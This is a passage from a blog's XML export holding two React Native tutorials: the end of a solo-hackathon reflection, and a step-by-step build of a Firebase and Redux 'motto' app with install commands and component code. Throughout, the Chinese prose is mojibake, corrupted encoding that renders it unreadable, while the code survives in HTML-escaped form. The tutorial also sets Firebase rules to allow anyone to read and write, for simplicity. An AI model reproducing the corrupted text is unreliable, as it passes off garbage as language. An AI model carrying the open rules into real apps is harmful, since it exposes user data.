å› ç‚ºæˆ‘ä¸­é–“æœ‰ç¡è¦ºï¼Œæ‰€ä»¥å¯¦éš›ä¸Š coding æ‡‰è©² 18 å€‹å°æ™‚å·¦å³ï¼Œå°±å¯ä»¥åšå‡ºä¸€å€‹å¯ä»¥å‹•ã€æœ‰æ¥ API åˆè·¨å¹³å°çš„ Appã€‚æ„æ€å°±æ˜¯èªªå¦‚æœä½ çš„ App æ²’æœ‰å¾ˆè¤‡é›œçš„è©±ï¼ŒåŸºæœ¬ä¸Šæ˜¯å¯ä»¥åœ¨å…©ä¸‰å¤©ä¹‹å…§å°±åšå‡ºä¸€å€‹é‚„ä¸éŒ¯çš„ prototypeã€‚
åªè¦æŒæ¡å¹¾å€‹å…ƒç´ ï¼šView, Button, Image, Navigator, ListView, TextInputï¼Œå·®ä¸å¤šå°±å¯ä»¥å®Œæˆ 80% çš„å·¥ä½œäº†ã€‚
æˆ‘æœ€å–œæ­¡çš„é‚„æ˜¯å®ƒçš„æ’ç‰ˆæ–¹å¼ï¼Œå°å‰ç«¯å·¥ç¨‹å¸«ä¾†èªªæ¯”è¼ƒç†Ÿæ‚‰ã€‚é–‹ç™¼ç’°å¢ƒçš„è¨­ç½®æˆ‘è¦ºå¾—ä¹Ÿæ¯” Native çš„ç°¡å–®è¨±å¤šï¼Œè€Œä¸”å¯ä»¥ç”¨ JavaScript æˆ‘è¦ºå¾—ä¹Ÿæ˜¯ä¸€å¤§å¥½è™•ã€‚
ä¹‹å‰çœ‹äº†é‚£éº¼å¤š React Native çš„ä»‹ç´¹æ–‡ï¼Œæˆ‘è¦ºå¾—æœ€å¿«é€Ÿèƒ½èªè­˜çš„æ–¹å¼é‚„æ˜¯è‡ªå·±è·³ä¸‹å»å¯« codeã€‚å¦‚æœå¤§å®¶å‡æ—¥æœ‰ç©ºçš„è©±ï¼Œä¹Ÿå¯ä»¥è©¦è©¦çœ‹ä¾†å ´è‡ªå·±ä¸€å€‹äººçš„é»‘å®¢æ¾ï¼ŒæŒ‘æˆ°åœ¨ 24 å°æ™‚ä»¥å…§ç”¨ React Native åšå‡ºä¸€å€‹ç°¡å–®çš„ Appï¼Œç›¸ä¿¡ä¸€å®šæœƒå¾ˆæœ‰æ”¶ç©«çš„ã€‚
æœ€å¾Œï¼Œé™„ä¸Šé€™å€‹ App çš„ Githubï¼šzeropass-react-nativeå¦‚æœæœ‰èˆˆè¶£çš„è©±å¯ä»¥åƒè€ƒçœ‹çœ‹ï¼ˆå› ç‚ºæ™‚é–“ç·Šè¿«ï¼Œæ‰€ä»¥å¾ˆå¤šæ±è¥¿éƒ½æ˜¯åªæ±‚èƒ½å‹•å°±å¥½ï¼Œå¾ˆå¤šéƒ½æ˜¯éŒ¯èª¤ç¤ºç¯„ï¼ŒçœŸçš„åªæ˜¯ã€Œåƒ…ä¾›åƒè€ƒã€ï¼‰
é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>react, react_native, android</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¸€çœ‹å°±æ‡‚çš„ React Native + Firebase Mobile App å…¥é–€æ•™å­¸</title>
    <url>/2016/09/10/react-native-redux-android-firebase/</url>
    <content><![CDATA[
å‰è¨€è·¨å¹³å°ï¼ˆWirte once, Run Everywhereï¼‰ä¸€ç›´ä»¥ä¾†æ˜¯è»Ÿé«”å·¥ç¨‹çš„è–æ¯ã€‚éå»ä¸€æ®µæ™‚é–“å¸‚å ´ä¸Šæœ‰è¨±å¤šå˜—è©¦è·¨å¹³å°é–‹ç™¼åŸç”Ÿè¡Œå‹•è£ç½®ï¼ˆNative Mobile Appï¼‰çš„è§£æ±ºæ–¹æ¡ˆï¼Œå˜—è©¦é‹ç”¨ HTMLã€CSSã€€å’Œ JavaScript ç­‰ç¶²é å‰ç«¯æŠ€è¡“é”åˆ°è·¨å¹³å°çš„æ•ˆæœï¼Œä¾‹å¦‚ï¼šé‹ç”¨ jQuery Mobileã€Ionic å’Œ Framework7 ç­‰ Mobile UI æ¡†æ¶ï¼ˆFrameworkï¼‰çµåˆ JavaScript æ¡†æ¶ä¸¦æ­é… Cordova&#x2F;PhoneGap é€²è¡Œè·¨å¹³å°è¡Œå‹•è£ç½®é–‹ç™¼ã€‚ç„¶è€Œï¼Œå› ç‚ºé€™äº›è§£æ±ºæ–¹æ¡ˆé€šå¸¸éƒ½æ˜¯é‹è¡Œåœ¨ WebView ä¹‹ä¸Šï¼Œå°è‡´æ•ˆèƒ½å’Œé«”é©—è¦çœŸæ­£è¶¨è¿‘æ–¼åŸç”Ÿæ‡‰ç”¨ç¨‹å¼ï¼ˆNative Appï¼‰é‚„æœ‰ä¸€æ®µè·¯è¦èµ°ã€‚
ä¸éï¼Œéš¨è‘— Facebook å·¥ç¨‹åœ˜éšŠé–‹ç™¼çš„ React Native æ©«ç©ºå‡ºä¸–ï¼Œæƒ³å˜—è©¦è·¨å¹³å°è§£æ±ºæ–¹æ¡ˆçš„é–‹ç™¼è€…åˆæœ‰äº†æ–°çš„é¸æ“‡ã€‚
React Native ç‰¹è‰²åœ¨æ­£å¼é–‹å§‹é–‹ç™¼ React Native App ä¹‹å‰æˆ‘å€‘å…ˆä¾†ä»‹ç´¹ä¸€ä¸‹ React Native çš„ä¸»è¦ç‰¹è‰²ï¼š

ä½¿ç”¨ JavaScriptï¼ˆES6+ï¼‰å’Œ React æ‰“é€ è·¨å¹³å°åŸç”Ÿæ‡‰ç”¨ç¨‹å¼ï¼ˆLearn once, write anywhereï¼‰
ä½¿ç”¨ Native Componentsï¼Œæ›´è²¼è¿‘åŸç”Ÿä½¿ç”¨è€…é«”é©—
åœ¨ JavaScript å’Œ Native ä¹‹é–“çš„æ“ä½œç‚ºéåŒæ­¥ï¼ˆAsynchronousï¼‰åŸ·è¡Œï¼Œä¸¦å¯ç”¨ Chrome é–‹ç™¼è€…å·¥å…·é™¤éŒ¯ï¼Œæ”¯æ´ Hot Reloading
ä½¿ç”¨ Flexbox é€²è¡Œæ’ç‰ˆå’Œå¸ƒå±€
è‰¯å¥½çš„å¯æ“´å±•æ€§ï¼ˆExtensibilityï¼‰ï¼Œå®¹æ˜“æ•´åˆ Web ç”Ÿæ…‹ç³»æ¨™æº–ï¼ˆXMLHttpRequestã€ navigator.geolocation ç­‰ï¼‰æˆ–æ˜¯åŸç”Ÿçš„å…ƒä»¶æˆ–å‡½å¼åº«ï¼ˆObjective-Cã€Java æˆ– Swiftï¼‰  
Facebook å·²ä½¿ç”¨ React Native æ–¼è‡ªå®¶ Production App ä¸”å°‡æŒçºŒç¶­è­·ï¼Œå¦å¤–ä¹Ÿæœ‰æŒçºŒè“¬å‹ƒç™¼å±•çš„æŠ€è¡“ç¤¾ç¾¤
è®“ Web é–‹ç™¼è€…å¯ä»¥ä½¿ç”¨ç†Ÿæ‚‰çš„æŠ€è¡“åˆ‡å…¥ Native App é–‹ç™¼
2015&#x2F;3 é‡‹å‡º iOS ç‰ˆæœ¬ï¼Œ2015&#x2F;9 é‡‹å‡º Android ç‰ˆæœ¬
ç›®å‰æ›´æ–°é€Ÿåº¦å¿«ï¼Œå¹³å‡æ¯å…©é€±ç™¼ä½ˆæ–°çš„ç‰ˆæœ¬ã€‚ç¤¾ç¾¤ä¹Ÿé‚„æŒçºŒåœ¨å°‹æ‰¾æœ€ä½³å¯¦è¸ï¼Œé—œæ–¼ç‰ˆæœ¬é€²å±•å¯ä»¥åƒè€ƒé€™å€‹æ–‡ä»¶
æ”¯æ´çš„ä½œæ¥­ç³»çµ±ç‚º &gt;&#x3D; Android 4.1 (API 16) å’Œ &gt;&#x3D; iOS 7.0

React Native åˆé«”é©—åœ¨äº†è§£äº† React Native ç‰¹è‰²å¾Œï¼Œæˆ‘å€‘æº–å‚™é–‹å§‹é–‹ç™¼æˆ‘å€‘çš„ React Native æ‡‰ç”¨ç¨‹å¼ï¼ç”±æ–¼æˆ‘å€‘çš„ç¯„ä¾‹å¯ä»¥è®“ç¨‹å¼è·¨å¹³å°å…±ç”¨ï¼Œæ‰€ä»¥ä½ å¯ä»¥ä½¿ç”¨ iOS å’Œ Android å¹³å°é‹è¡Œã€‚ä¸éè‹¥æ˜¯æƒ³åœ¨ iOS å¹³å°é–‹ç™¼éœ€è¦å…ˆæº–å‚™ Mac OS å’Œå®‰è£ Xcode é–‹ç™¼å·¥å…·ï¼Œè‹¥æ˜¯ä½ æº–å‚™ä½¿ç”¨ Android å¹³å°çš„è©±å»ºè­°å…ˆè¡Œå®‰è£ Android Studio å’Œ Genymotion æ¨¡æ“¬å™¨ã€‚åœ¨æˆ‘å€‘ç¯„ä¾‹æˆ‘å€‘ä½¿ç”¨ç­†è€…ä½¿ç”¨çš„ MacO OS ä½œæ¥­ç³»çµ±ä¸¦ä½¿ç”¨ Android å¹³å°ç‚ºä¸»è¦ç¯„ä¾‹ï¼Œè‹¥æœ‰å…¶ä»–ä½œæ¥­ç³»çµ±éœ€æ±‚çš„è®€è€…å¯ä»¥åƒè€ƒ å®˜æ–¹å®‰è£èªªæ˜ã€‚
ä¸€é–‹å§‹è«‹å…ˆå®‰è£ Nodeã€Watchman å’Œ React Native command line å·¥å…·ï¼š
// è‹¥ä½ ä½¿ç”¨ Mac OS ä½ å¯ä»¥ä½¿ç”¨å®˜ç¶²å®‰è£æ–¹å¼æˆ–æ˜¯ä½¿ç”¨ homebrew å®‰è£$ brew install node// watchman å¯ä»¥ç›£çœ‹æª”æ¡ˆæ˜¯å¦æœ‰ä¿®æ”¹$ brew install watchman

// å®‰è£ React Native command line å·¥å…·$ npm install -g react-native-cli

ç”±æ–¼æˆ‘å€‘æ˜¯è¦é–‹ç™¼ Android å¹³å°ï¼Œæ‰€ä»¥å¿…é ˆå®‰è£ï¼š

å®‰è£ JDK
å®‰è£ Android SDK
è¨­å®šä¸€äº›ç’°å¢ƒè®Šæ•¸

ä»¥ä¸Šå¯ä»¥é€é Install Android Studio å®˜ç¶²å’Œ å®˜æ–¹å®‰è£èªªæ˜ æ­¥é©Ÿå®Œæˆã€‚
ç¾åœ¨ï¼Œæˆ‘å€‘å…ˆé€éä¸€å€‹ç°¡å–®çš„ HelloWorldAppï¼Œè®“å¤§å®¶æ„Ÿå—ä¸€ä¸‹ React Native å°ˆæ¡ˆå¦‚ä½•é–‹ç™¼ã€‚
é¦–å…ˆï¼Œæˆ‘å€‘å…ˆåˆå§‹åŒ–ä¸€å€‹ React Native Projectï¼š
$ react-native init HelloWorldApp

åˆå§‹çš„è³‡æ–™å¤¾çµæ§‹é•·ç›¸ï¼š

æ¥ä¸‹ä¾†è«‹å…ˆå®‰è£è¨»å†Š Genymotionï¼ŒGenymotion æ˜¯ä¸€å€‹é€éé›»è…¦æ¨¡æ“¬ Android ç³»çµ±çš„å¥½ç”¨é–‹ç™¼æ¨¡æ“¬å™¨ç’°å¢ƒã€‚å®‰è£å®Œå¾Œå¯ä»¥æ‰“é–‹ä¸¦é¸æ“‡æ¬²ä½¿ç”¨çš„è¢å¹•å¤§å°å’Œ API ç‰ˆæœ¬çš„ Android ç³»çµ±ã€‚å»ºç«‹è£ç½®å¾Œå°±å¯ä»¥å•Ÿå‹•æˆ‘å€‘çš„è£ç½®ï¼š

è‹¥ä½ æ˜¯ä½¿ç”¨ Mac OS ä½œæ¥­ç³»çµ±çš„è©±å¯ä»¥åŸ·è¡Œ run-iosï¼Œè‹¥æ˜¯ä½¿ç”¨ Android å¹³å°å‰‡ä½¿ç”¨ run-android å•Ÿå‹•ä½ çš„ Appã€‚åœ¨é€™é‚Šæˆ‘å€‘å…ˆä½¿ç”¨ Android å¹³å°é€²è¡Œé–‹ç™¼ï¼ˆè‹¥ä½ å¸Œæœ›å¯¦æ©Ÿæ¸¬è©¦ï¼Œè«‹å°‡é›»è…¦æ¥ä¸Šä½ çš„ Android æ‰‹æ©Ÿï¼Œè¨˜å¾—ç¢ºä¿ menu ä¸­çš„ ip ä½ç½®è¦å’Œé›»è…¦ç¶²è·¯ ç›¸åŒã€‚è‹¥æ˜¯é‡åˆ°é€£ä¸åˆ°ç¨‹å¼ server ä¸”æ‰‹æ©Ÿç‚º Android 5.0+ ç³»çµ±ï¼Œå¯ä»¥åŸ·è¡Œ adb reverse tcp:8081 tcp:8081ï¼Œè©³ç´°æƒ…å½¢å¯ä»¥åƒè€ƒå®˜ç¶²èªªæ˜ï¼‰ï¼š
$ react-native run-android

å¦‚æœä¸€åˆ‡é †åˆ©çš„è©±å°±å¯ä»¥åœ¨æ¨¡æ“¬å™¨ä¸­çœ‹åˆ°åˆå§‹ç•«é¢ï¼š

æ¥è‘—æ‰“é–‹ index.android.js å°±å¯ä»¥çœ‹åˆ°ä»¥ä¸‹ç¨‹å¼ç¢¼ï¼š
import React, &#123; Component &#125; from &#x27;react&#x27;;import &#123;  AppRegistry,  StyleSheet,  Text,  View&#125; from &#x27;react-native&#x27;;// å…ƒä»¶å¼çš„é–‹ç™¼æ–¹å¼å’Œ React å¦‚å‡ºä¸€è½ï¼Œä½†è¦æ³¨æ„çš„æ˜¯åœ¨ React Native ä¸­æˆ‘å€‘ä¸ä½¿ç”¨ HTML å…ƒç´ è€Œæ˜¯ä½¿ç”¨ React Native å…ƒä»¶é€²è¡Œé–‹ç™¼ï¼Œé€™ä¹Ÿç¬¦åˆ Learn once, write anywhere çš„åŸå‰‡ã€‚class HelloWorldApp extends Component &#123;  render() &#123;    return (      &lt;View style=&#123;styles.container&#125;&gt;        &lt;Text style=&#123;styles.welcome&#125;&gt;          Welcome to React Native!        &lt;/Text&gt;        &lt;Text style=&#123;styles.instructions&#125;&gt;          To get started, edit index.android.js        &lt;/Text&gt;        &lt;Text style=&#123;styles.instructions&#125;&gt;          Double tap R on your keyboard to reload,&#123;&#x27;\n&#x27;&#125;          Shake or press menu button for dev menu        &lt;/Text&gt;      &lt;/View&gt;    );  &#125;&#125;// åœ¨ React Native ä¸­ styles æ˜¯ä½¿ç”¨ JavaScript å½¢å¼ä¾†æ’°å¯«ï¼Œèˆ‡ä¸€èˆ¬ CSS æ¯”è¼ƒä¸åŒçš„æ˜¯ä»–ä½¿ç”¨é§å³°å¼çš„å±¬æ€§å‘½åï¼šconst styles = StyleSheet.create(&#123;  container: &#123;    flex: 1,    justifyContent: &#x27;center&#x27;,    alignItems: &#x27;center&#x27;,    backgroundColor: &#x27;#F5FCFF&#x27;,  &#125;,  welcome: &#123;    fontSize: 20,    textAlign: &#x27;center&#x27;,    margin: 10,  &#125;,  instructions: &#123;    textAlign: &#x27;center&#x27;,    color: &#x27;#333333&#x27;,    marginBottom: 5,  &#125;,&#125;);// å‘Šè¨´ React Native App ä½ çš„é€²å…¥é»ï¼šAppRegistry.registerComponent(&#x27;HelloWorldApp&#x27;, () =&gt; HelloWorldApp);

ç”±æ–¼ React Native æœ‰æ”¯æ´ Hot Reloadingï¼Œè‹¥æˆ‘å€‘æ›´æ”¹äº†æª”æ¡ˆå…§å®¹ï¼Œæˆ‘å€‘å¯ä»¥ä½¿ç”¨æ‰“é–‹æ¨¡æ“¬å™¨ Menu é‡æ–°åˆ·æ–°é é¢ï¼Œæ­¤æ™‚å°±å¯ä»¥åœ¨çœ‹åˆ°åŸæœ¬çš„ Welcome to React Native! æ–‡å­—å·²ç¶“æ”¹æˆ Welcome to React Native Rock!!!! 


å—¯ï¼Œæœ‰æ²’æœ‰æ„Ÿè¦ºåœ¨é–‹ç™¼ç¶²é çš„æ„Ÿè¦ºï¼Ÿ
å‹•æ‰‹å¯¦ä½œç›¸ä¿¡çœ‹åˆ°é€™è£¡è®€è€…å€‘ä¸€å®šç­‰ä¸åŠæƒ³å¤§å±•èº«æ‰‹ï¼Œä½¿ç”¨ React Native é–‹ç™¼ä½ ç¬¬ä¸€å€‹ Appã€‚ä¿—è©±èªªå­¸ç¿’ä¸€é …æ–°æŠ€è¡“æœ€å¥½çš„æ–¹å¼å°±æ˜¯åšä¸€å€‹ TodoAppã€‚æ‰€ä»¥ï¼Œæ¥ä¸‹ä¾†çš„æ–‡ç« ï¼Œç­†è€…å°‡å¸¶å¤§å®¶ä½¿ç”¨ React Native çµåˆ Redux&#x2F;ImmutableJS å’Œ Firebase é–‹ç™¼ä¸€å€‹è¨˜éŒ„å’Œåˆªé™¤åè¨€ä½³å¥ï¼ˆMottosï¼‰çš„ Mobile Appï¼
å°ˆæ¡ˆæˆæœæˆªåœ–

ç’°å¢ƒå®‰è£èˆ‡è¨­å®šç›¸é—œå¥—ä»¶å®‰è£ï¼š
$ npm install --save redux react-redux immutable redux-immutable redux-actions uuid firebase

$ npm install --save-dev babel-core babel-eslint babel-loader babel-preset-es2015 babel-preset-react babel-preset-react-native eslint-plugin-react-native  eslint eslint-config-airbnb eslint-loader eslint-plugin-import eslint-plugin-jsx-a11y eslint-plugin-react redux-logger

å®‰è£å®Œç›¸é—œå·¥å…·å¾Œæˆ‘å€‘å¯ä»¥åˆå§‹åŒ–æˆ‘å€‘å°ˆæ¡ˆï¼š
// æ³¨æ„å°ˆæ¡ˆä¸èƒ½ä½¿ç”¨ - æˆ– _ å‘½å$ react-native init ReactNativeFirebaseMotto$ cd ReactNativeFirebaseMotto

æˆ‘å€‘å…ˆæº–å‚™ä¸€ä¸‹æˆ‘å€‘è³‡æ–™å¤¾æ¶æ§‹ï¼Œå°‡å®ƒè¨­è¨ˆæˆï¼š

Firebase ç°¡ä»‹èˆ‡è¨­å®šåœ¨é€™å€‹å°ˆæ¡ˆä¸­æˆ‘å€‘æœƒä½¿ç”¨åˆ° Firebase é€™å€‹ Back-End as Serviceçš„æœå‹™ï¼Œä¹Ÿå°±æ˜¯èªªæˆ‘å€‘ä¸ç”¨è‡ªå·±å»ºç«‹å¾Œç«¯ç¨‹å¼è³‡æ–™åº«ï¼Œåªè¦ä½¿ç”¨ Firebase æ‰€æä¾›çš„ API å°±å¥½åƒæœ‰äº†ä¸€å€‹ NoSQL è³‡æ–™åº«ä¸€æ¨£ï¼Œç•¶ç„¶ Firebase ä¸å–®åªæœ‰æä¾›è³‡æ–™å„²å­˜çš„åŠŸèƒ½ï¼Œä½†é™æ–¼ç¯‡å¹…æˆ‘å€‘é€™é‚Šå°‡åªä»‹ç´¹è³‡æ–™å„²å­˜çš„åŠŸèƒ½ã€‚ 

é¦–å…ˆæˆ‘å€‘é€²åˆ° Firebase é¦–é   

ç™»å…¥å¾Œé»é¸å»ºç«‹å°ˆæ¡ˆï¼Œä¾ç…§è‡ªå·±æƒ³å–çš„å°ˆæ¡ˆåç¨±å‘½å


  

é¸æ“‡å°‡ Firebase åŠ å…¥ä½ çš„ç¶²è·¯æ‡‰ç”¨ç¨‹å¼çš„æŒ‰éˆ•å¯ä»¥å–å¾— App ID çš„ config è³‡æ–™ï¼Œå¾…æœƒæˆ‘å€‘å°‡æœƒä½¿ç”¨åˆ°

  

é»é¸å·¦é‚Šé¸å–®ä¸­çš„ Database ä¸¦é»é¸ Realtime Database Tab ä¸­çš„è¦å‰‡

  
  è¨­å®šæ”¹ç‚ºï¼Œåœ¨ç¯„ä¾‹ä¸­ç‚ºæ±‚ç°¡å–®ï¼Œæˆ‘å€‘å…ˆä¸ç”¨é©—è­‰æ–¹å¼å³å¯æ“ä½œï¼š
  &#123;  &quot;rules&quot;: &#123;    &quot;.read&quot;: true,    &quot;.write&quot;: true  &#125;&#125;

Firebase åœ¨ä½¿ç”¨ä¸Šæœ‰è¨±å¤šå„ªé»ï¼Œå…¶ä¸­ä¸€å€‹ä½¿ç”¨ Back-End As Service çš„å¥½è™•æ˜¯ä½ å¯ä»¥å°ˆæ³¨åœ¨æ‡‰ç”¨ç¨‹å¼çš„é–‹ç™¼ä¾¿å…èŠ±éå¤šæ™‚é–“è™•ç†å¾Œç«¯åŸºç¤å»ºè¨­çš„éƒ¨ä»½ï¼Œæ›´å¯ä»¥è®“ Back-End å…±ç”¨åœ¨ä¸åŒçš„ client side ä¸­ã€‚æ­¤å¤– Firebase åœ¨å’Œ React æ•´åˆä¸Šä¹Ÿååˆ†å®¹æ˜“ï¼Œä½ å¯ä»¥æƒ³æˆ Firebase è² è²¬è³‡æ–™çš„å„²å­˜ï¼Œé€é API å’Œ React å…ƒä»¶äº’å‹•ï¼ŒRedux è² è²¬æ¥æ”¶ç®¡ç† client stateï¼Œè‹¥æ˜¯ç›£è½åˆ° Firebase å¾Œç«¯è³‡æ–™æ›´æ–°å¾ŒåŒæ­¥æ›´æ–° state ä¸¦é‡æ–° render é é¢ã€‚
ä½¿ç”¨ Flexbox é€²è¡Œ UI å¸ƒå±€è¨­è¨ˆåœ¨ React Native ä¸­æ˜¯ä½¿ç”¨ Flexbox é€²è¡Œæ’ç‰ˆï¼Œè‹¥è®€è€…å°æ–¼ Flexbox å°šä¸ç†Ÿæ‚‰ï¼Œå»ºè­°å¯ä»¥åƒè€ƒé€™ç¯‡æ–‡ç« ï¼Œè‹¥æœ‰éœ€è¦éŠæˆ²åŒ–çš„å­¸ç¿’å·¥å…·ï¼Œä¹Ÿéå¸¸æ¨è–¦é€™å…©å€‹æ•™å­¸å°éŠæˆ²ï¼šFlexDefenseã€FLEXBOX FROGGYã€‚
äº‹å¯¦ä¸Šæˆ‘å€‘å¯ä»¥å°‡ Flexbox è¦–ç‚ºä¸€å€‹ç®±å­ï¼Œæœ€å¤–å±¤æ˜¯ flex containersã€å…§å±¤åŒ…çš„æ˜¯ flex itemsï¼Œåœ¨å±¬æ€§ä¸Šä¹Ÿæœ‰åˆ†æ˜¯é‡å°flex containers é‚„æ˜¯é‡å°æ˜¯ flex items è¨­è¨ˆçš„ã€‚åœ¨æ–¹å‘æ€§ä¸Šç”±å·¦è€Œå³æ˜¯ main axisï¼Œè€Œä¸Šåˆ°ä¸‹æ˜¯ cross axisã€‚

åœ¨ Flexbox æœ‰è¨±å¤šå±¬æ€§å€¼ï¼Œå…¶ä¸­æœ€é‡è¦çš„ç•¶æ•¸ justifyContent å’Œ alignItems ä»¥åŠ flexDirectionï¼ˆæ³¨æ„ React Native Style éƒ½æ˜¯é§å³°å¼å¯«æ³•ï¼‰ï¼Œæ‰€ä»¥æˆ‘å€‘é€™é‚Šä¸»è¦ä»‹ç´¹é€™ä¸‰å€‹å±¬æ€§ï¼š
Flex Direction è² è²¬æ±ºå®šæ•´å€‹ flex containers çš„æ–¹å‘ï¼Œé è¨­ç‚º row ä¹Ÿå¯ä»¥æ”¹ç‚º column ã€ row-reverse å’Œ column-reverseã€‚

Justify Content è² è²¬æ±ºå®šæ•´å€‹ flex containers å…§çš„ items çš„æ°´å¹³æ“ºè¨­ï¼Œä¸»è¦å±¬æ€§å€¼æœ‰ï¼šflex-startã€flex-endã€centerã€space-betweenã€space-aroundã€‚

Align Items è² è²¬æ±ºå®šæ•´å€‹ flex containers å…§çš„ items çš„å‚ç›´æ“ºè¨­ï¼Œä¸»è¦å±¬æ€§å€¼æœ‰ï¼šflex-startã€flex-endã€centerã€stretchã€baselineã€‚

å‹•æ‰‹å¯¦ä½œæœ‰äº†å‰é¢çš„æº–å‚™ï¼Œç¾åœ¨æˆ‘å€‘çµ‚æ–¼è¦é–‹å§‹é€²å…¥æ ¸å¿ƒçš„æ‡‰ç”¨ç¨‹å¼é–‹ç™¼äº†ï¼
é¦–å…ˆæˆ‘å€‘å…ˆè¨­å®šå¥½æ•´å€‹ App çš„é€²å…¥æª” index.android.jsï¼Œåœ¨é€™å€‹æª”æ¡ˆä¸­æˆ‘å€‘è¨­å®šäº†åˆå§‹åŒ–çš„è¨­å®šå’Œä¸»è¦å…ƒä»¶ &lt;Main /&gt;ï¼š
/** * Sample React Native App * https://github.com/facebook/react-native * @flow */import React, &#123; Component &#125; from &#x27;react&#x27;;import &#123;  AppRegistry,  Text,  View&#125; from &#x27;react-native&#x27;;import Main from &#x27;./src/components/Main&#x27;;class ReactNativeFirebaseMotto extends Component &#123;  render() &#123;    return (      &lt;Main /&gt;    );  &#125;&#125;AppRegistry.registerComponent(&#x27;ReactNativeFirebaseMotto&#x27;, () =&gt; ReactNativeFirebaseMotto);

åœ¨ src/components/Main/Main.js ä¸­æˆ‘å€‘è¨­å®šå¥½æ•´å€‹ Component çš„å¸ƒå±€å’Œä¸¦å°‡ Firebase å¼•å…¥ä¸¦åˆå§‹åŒ–ï¼Œå°‡æ“ä½œ Firebase è³‡æ–™åº«çš„åƒè€ƒå¾€ä¸‹å‚³ï¼Œæ ¹ç¯€é»æˆ‘å€‘å‘½åç‚º itemsï¼Œæ‰€ä»¥ä¹‹å¾Œæ‰€æœ‰æ–°å¢çš„ motto éƒ½æœƒåœ¨é€™å€‹æ ¹ç¯€é»ä¹‹ä¸‹ä¸¦æ“æœ‰ç‰¹å®šçš„ key å€¼ã€‚åœ¨ Main æˆ‘å€‘åŒæ¨£è¦åŠƒäº†æ•´å€‹å¸ƒå±€ï¼ŒåŒ…æ‹¬ï¼š&lt;ToolBar /&gt;ã€&lt;MottoListContainer /&gt;ã€&lt;ActionButtonContainer /&gt;ã€&lt;InputModalContainer /&gt;ã€‚
import React from &#x27;react&#x27;;import ReactNative from &#x27;react-native&#x27;;import &#123; Provider &#125; from &#x27;react-redux&#x27;; import ToolBar from &#x27;../ToolBar&#x27;;import MottoListContainer from &#x27;../../containers/MottoListContainer&#x27;;import ActionButtonContainer from &#x27;../../containers/ActionButtonContainer&#x27;;import InputModalContainer from &#x27;../../containers/InputModalContainer&#x27;;import ListItem from &#x27;../ListItem&#x27;;import * as firebase from &#x27;firebase&#x27;;// å°‡ Firebase çš„ config å€¼å¼•å…¥import &#123; firebaseConfig &#125; from &#x27;../../constants/config&#x27;;// å¼•ç”¨ Redux storeimport store from &#x27;../../store&#x27;;const &#123; View, Text &#125; = ReactNative;// Initialize Firebaseconst firebaseApp = firebase.initializeApp(firebaseConfig);// Create a reference with .ref() instead of new Firebase(url)const rootRef = firebaseApp.database().ref();const itemsRef = rootRef.child(&#x27;items&#x27;);// å°‡ Redux çš„ store é€é Provider å¾€ä¸‹å‚³const Main = () =&gt; (  &lt;Provider store=&#123;store&#125;&gt;    &lt;View&gt;      &lt;ToolBar style=&#123;styles.toolBar&#125; /&gt;      &lt;MottoListContainer itemsRef=&#123;itemsRef&#125; /&gt;      &lt;ActionButtonContainer /&gt;      &lt;InputModalContainer itemsRef=&#123;itemsRef&#125; /&gt;    &lt;/View&gt;  &lt;/Provider&gt;);export default Main; 

è¨­å®šå®Œäº†åŸºæœ¬çš„å¸ƒå±€æ–¹å¼å¾Œæˆ‘å€‘ä¾†è¨­å®š Actions å’Œå…¶ä½¿ç”¨çš„å¸¸æ•¸ï¼Œsrc/actions/mottoActions.jsï¼š
export const GET_MOTTOS = &#x27;GET_MOTTOS&#x27;;export const CREATE_MOTTO = &#x27;CREATE_MOTTO&#x27;;export const SET_IN_MOTTO = &#x27;SET_IN_MOTTO&#x27;;export const TOGGLE_MODAL = &#x27;TOGGLE_MODAL&#x27;;

æˆ‘å€‘åœ¨ constants è³‡æ–™å¤¾ä¸­ä¹Ÿè¨­å®šäº†æˆ‘å€‘æ•´å€‹ data çš„è³‡æ–™çµæ§‹ï¼Œä»¥ä¸‹æ˜¯ src/constants/models.jsï¼š
import Immutable from &#x27;immutable&#x27;;export const MottoState = Immutable.fromJS(&#123;  mottos: [],  motto: &#123;    id : &#x27;&#x27;,    text: &#x27;&#x27;,    updatedAt: &#x27;&#x27;,  &#125;&#125;);export const UiState = Immutable.fromJS(&#123;  isModalVisible: false,&#125;);

é‚„è¨˜å¾—æˆ‘å€‘æåˆ°çš„ Firebase config å—ï¼Ÿé€™é‚Šæˆ‘å€‘æŠŠç›¸é—œçš„è¨­å®šæª”æ”¾åœ¨src/configs/config.jsä¸­ï¼š 
export const firebaseConfig = &#123;  apiKey: &quot;apiKey&quot;,  authDomain: &quot;authDomain&quot;,  databaseURL: &quot;databaseURL&quot;,  storageBucket: &quot;storageBucket&quot;,&#125;;

åœ¨æˆ‘å€‘æ‡‰ç”¨ç¨‹å¼ä¸­åŒæ¨£ä½¿ç”¨äº† redux å’Œ redux-actionsã€‚åœ¨é€™å€‹ç¯„ä¾‹ä¸­æˆ‘å€‘è¨­è¨ˆäº†ï¼šGET_MOTTOSã€CREATE_MOTTOã€SET_IN_MOTTO ä¸‰å€‹æ“ä½œ motto çš„ actionï¼Œåˆ†åˆ¥ä»£è¡¨å¾ Firebase å–å‡ºè³‡æ–™ã€æ–°å¢è³‡æ–™å’Œ set è³‡æ–™ã€‚ä»¥ä¸‹æ˜¯ src/actions/mottoActions.jsï¼š
import &#123; createAction &#125; from &#x27;redux-actions&#x27;;import &#123;  GET_MOTTOS,  CREATE_MOTTO,  SET_IN_MOTTO,&#125; from &#x27;../constants/actionTypes&#x27;;export const getMottos = createAction(&#x27;GET_MOTTOS&#x27;);export const createMotto = createAction(&#x27;CREATE_MOTTO&#x27;);export const setInMotto = createAction(&#x27;SET_IN_MOTTO&#x27;);

åŒæ¨£åœ°ï¼Œç”±æ–¼æˆ‘å€‘è¨­è¨ˆäº†ç•¶ä½¿ç”¨è€…æƒ³æ–°å¢ motto æ™‚æœƒè·³å‡º modalï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥è¨­å®šä¸€å€‹ TOGGLE_MODAL è² è²¬é–‹é—œ modal çš„ stateã€‚ä»¥ä¸‹æ˜¯ src/actions/uiActions.jsï¼š
import &#123; createAction &#125; from &#x27;redux-actions&#x27;;import &#123;  TOGGLE_MODAL,&#125; from &#x27;../constants/actionTypes&#x27;;export const toggleModal = createAction(&#x27;TOGGLE_MODAL&#x27;);

